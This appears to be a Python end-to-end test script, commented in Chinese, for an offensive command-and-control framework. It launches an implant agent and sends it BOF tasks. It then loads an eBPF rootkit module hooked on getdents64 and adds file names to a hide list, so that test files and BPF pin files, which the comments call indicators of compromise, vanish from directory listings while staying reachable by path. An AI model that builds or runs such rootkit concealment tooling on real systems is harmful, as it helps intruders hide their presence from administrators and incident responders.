#!/usr/bin/env python3
"""P0-3 验收：复活层 × 隐藏层联动（hide_add）—— 方案 §3.3 / 完全体 G7 + D2

T1 阳性对照：hide **之前**必须看得见测试名（ISS-020 规则：任何"不可见"断言
             都要先证明同一观测手段能看到一个已知存在的样本）
T2 ebpf_load 加载 hide 模块（tracepoint sys_exit_getdents64）
T3 hide_add 事后补写 hide_names —— 这是 P0-3 的新代码
T4 目标名不可见，**同目录其它文件仍可见**（证明过滤是选择性的，不是观测坏了）
T5 /sys/fs/bpf 的 pin 文件也能藏（完全体 D2：pin 是明确 IOC）
T6 清场：unload + 删测试文件 + 杀 agent
"""
import base64, os, struct, subprocess, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
import gap10_rootkit_verify as g10
from gap11_session_soak import _rows, max_id

DIR  = "/tmp/p03d"
NAME = "axg_p03_%d" % (os.getpid() % 100000)
PIN  = "axp03"
R    = []


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%-4s] %-46s %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


def sh(c):
    return subprocess.run(["bash", "-lc", c], capture_output=True, text=True).stdout


def blob(*fields):
    """参数 blob：[4B count][ (4B len + bytes)* ]"""
    out = struct.pack("<I", len(fields))
    for f in fields:
        b = f.encode() if isinstance(f, str) else f
        out += struct.pack("<I", len(b)) + b
    return out


def run_bof(aid, bofname, argblob, timeout=60):
    """execute bof <bofname>.o（参数走 param_data 精确字节），按 a_task_id 等 107。"""
    base = max_id(aid)
    e2e.send_execute(aid, "execute bof %s.o" % bofname,
                     {"command": "execute", "subcommand": "bof",
                      "bof": "%s/%s.o" % (g10.BOF_DIR, bofname),
                      "param_data": base64.b64encode(argblob).decode()})
    tid, t0 = None, time.time()
    while tid is None and time.time() - t0 < 30:
        for r in _rows(aid, base):
            if r.get("type") == 106 and bofname in str(r.get("a_cmdline", "")):
                tid = r.get("a_task_id")
        if tid is None:
            time.sleep(1)
    t0 = time.time()
    while time.time() - t0 < timeout:
        for r in _rows(aid, base):
            if r.get("type") == 107 and r.get("a_task_id") == tid:
                return str(r.get("a_text", ""))
        time.sleep(1)
    return None


def main():
    binp = e2e.gen_agent("TestHTTP", "p03")
    pid  = e2e.launch(binp)
    aid  = e2e.wait_registered("TestHTTP", pid, timeout=90)
    print("[p03] agent id=%s pid=%d  测试名=%s" % (aid, pid, NAME), flush=True)

    # ── T1 阳性对照 ──
    sh("rm -rf %s && mkdir -p %s && echo '# p03 test' > %s/%s && touch %s/keepme"
       % (DIR, DIR, DIR, NAME, DIR))
    v1 = sh("ls %s" % DIR).split()
    rec("T1 阳性对照：hide 前可见", NAME in v1 and "keepme" in v1, str(v1))

    # ── T2 加载 hide 模块 ──
    g10.send_bof(aid, "ebpf_load", g10.pack_load(
        "%s/hide.insns.bin" % g10.BPF_OUT, "%s/hide.mapreloc.txt" % g10.BPF_OUT,
        5, 1, "syscalls/sys_exit_getdents64", "", "", b"", PIN))
    t2 = ""
    for _ in range(30):
        time.sleep(3)
        t2 = "\n".join(g10.bof_texts(aid, 3))
        if "attach" in t2 or "failed" in t2:
            break
    rec("T2 hide 模块已加载", ("cpus=" in t2 or "attach" in t2) and "failed" not in t2,
        (t2.strip().splitlines() or [""])[-1][:80])

    # ── T3 事后补写 hide_names（P0-3 新代码）──
    t3 = run_bof(aid, "hide_add", blob(PIN, NAME, PIN + "_map0"))
    rec("T3 hide_add 回执 [+] 且计数=2",
        t3 and "[+] hide_add: 2 name(s)" in t3,
        (t3 or "").strip().replace("\n", " | ")[:100])

    # ── T4 选择性不可见 ──
    time.sleep(1)
    v4 = sh("ls %s" % DIR).split()
    rec("T4 目标不可见 / keepme 仍可见", NAME not in v4 and "keepme" in v4, str(v4))

    # ── T5 pin 文件（完全体 D2）──
    # ★ P8 起 pin 名由加载器**自动**隐藏（ebpf_load §6c），不再依赖手工 hide_add。
    #   于是"`ls` 里看不见"**单独**已经没有分辨力了 —— 这个目录的基线本来就是空的，
    #   "全藏起来了"与"什么都没 pin"输出逐字相同。判据必须成对：
    #     看不见（枚举，走 getdents） ＋ 还在（按**路径** stat，走 sys_newlstat）
    #   后者才是"隐藏 ≠ 不可用"的实证，也是 ISS-061 那条边界的现场。
    time.sleep(1)
    v5 = sh("ls /sys/fs/bpf").split()
    pin_hidden = (PIN + "_map0") not in v5
    pin_alive = os.path.exists("/sys/fs/bpf/%s_map0" % PIN)
    rec("T5 pin %s_map0 枚举不可见 ＋ 按路径仍在" % PIN, pin_hidden and pin_alive,
        "ls 中 %s* 项=%s；按路径存在=%s"
        % (PIN, [x for x in v5 if PIN in x] or "无", pin_alive))

    # ── T6 清场 + ISS-008 现场取证 ──
    # 必须 run_bof 等回执：send_bof 是异步的，而实测单次 beacon 往返 20–28s，
    # sleep 20 会在 unload 执行前就 kill 掉 agent（ISS-026 同类）。
    t6 = run_bof(aid, "ebpf_unload", g10.pack_unload(PIN, ""), timeout=90)
    rec("T6a unload 回执 unpinned >=6",
        bool(t6) and "unpinned" in t6 and "[-]" not in t6,
        (t6 or "").strip().replace("\n", " | ")[:100])

    time.sleep(2)
    # ★ 判据从"`ls` 里没有"改成"按**显式路径**逐个后缀复查" —— 后者走 unlink/stat
    #   （不过 getdents），P8 之后 pin 名被藏起来也照样测得准；反过来 `ls` 版本
    #   在 P8 之后会**恒真**（目录里本来就没有可见项），属于判据被掏空。
    suf_all = ("_prog", "_link") + tuple("_map%d" % i for i in range(8))
    left6 = [s for s in suf_all if os.path.exists("/sys/fs/bpf/%s%s" % (PIN, s))]
    rec("T6b pin 文件已 unlink（按显式路径复查 10 个后缀）", not left6,
        left6 or "（全无）")

    # ISS-008 判据：unload 是否让 hide **立即**失效（tracepoint 是否被 detach）
    v6c = sh("ls %s" % DIR).split()
    rec("[已知缺口 ISS-008] unload 后 hide 立即失效",
        NAME in v6c, "目标名仍不可见 → tracepoint 未 detach（与 ISS-008 一致）")

    e2e.kill(pid)
    time.sleep(2)
    v6d = sh("ls %s" % DIR).split()
    rec("T6c 对照：agent 退出后 hide 必然失效", NAME in v6d, str(v6d))
    sh("rm -rf %s" % DIR)

    print("\nPASS=%d FAIL=%d" % (R.count(True), R.count(False)))
    print("RESULT: %s" % ("PASS" if all(R) else "FAIL"))


if __name__ == "__main__":
    main()
